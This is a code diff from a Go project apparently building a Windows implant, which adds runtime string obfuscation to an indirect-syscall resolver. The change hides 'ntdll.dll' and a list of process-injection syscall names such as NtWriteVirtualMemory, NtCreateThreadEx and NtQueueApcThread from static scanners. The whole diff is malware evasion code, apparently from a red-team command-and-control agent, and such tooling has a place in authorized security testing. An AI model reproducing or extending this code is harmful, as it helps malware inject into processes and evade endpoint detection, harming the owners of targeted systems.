@@ -8,6 +8,8 @@ import (
 	"syscall"
 	"unsafe"
 
+	"fawkes/pkg/obfuscate"
+
 	"golang.org/x/sys/windows"
 )
 
@@ -85,8 +87,10 @@ func (r *SyscallResolver) init() error {
 		return nil
 	}
 
-	// Step 1: Get ntdll base address
-	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
+	// Step 1: Get ntdll base address (decrypt name at runtime)
+	ntdllStr := obfuscate.NtdllDll()
+	defer obfuscate.Zero(ntdllStr)
+	ntdllName, _ := syscall.UTF16PtrFromString(ntdllStr)
 	ntdllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
 	if ntdllBase == 0 {
 		return fmt.Errorf("failed to resolve base module")
@@ -112,21 +116,22 @@ func (r *SyscallResolver) init() error {
 	r.stubOffset = 0
 
 	// Step 4: Generate indirect stubs for key Nt* functions
+	// Names are decrypted at runtime from the obfuscation table
 	keyFunctions := []string{
-		"NtAllocateVirtualMemory",
-		"NtWriteVirtualMemory",
-		"NtProtectVirtualMemory",
-		"NtCreateThreadEx",
-		"NtFreeVirtualMemory",
-		"NtOpenProcess",
-		"NtClose",
-		"NtReadVirtualMemory",
-		"NtQueryInformationProcess",
-		"NtResumeThread",
-		"NtGetContextThread",
-		"NtSetContextThread",
-		"NtOpenThread",
-		"NtQueueApcThread",
+		obfuscate.NtAllocateVirtualMemory(),
+		obfuscate.NtWriteVirtualMemory(),
+		obfuscate.NtProtectVirtualMemory(),
+		obfuscate.NtCreateThreadEx(),
+		obfuscate.NtFreeVirtualMemory(),
+		obfuscate.NtOpenProcess(),
+		obfuscate.NtClose(),
+		obfuscate.NtReadVirtualMemory(),
+		obfuscate.NtQueryInformationProcess(),
+		obfuscate.NtResumeThread(),
+		obfuscate.NtGetContextThread(),
+		obfuscate.NtSetContextThread(),
+		obfuscate.NtOpenThread(),
+		obfuscate.NtQueueApcThread(),
 	}
 
 	for _, name := range keyFunctions {
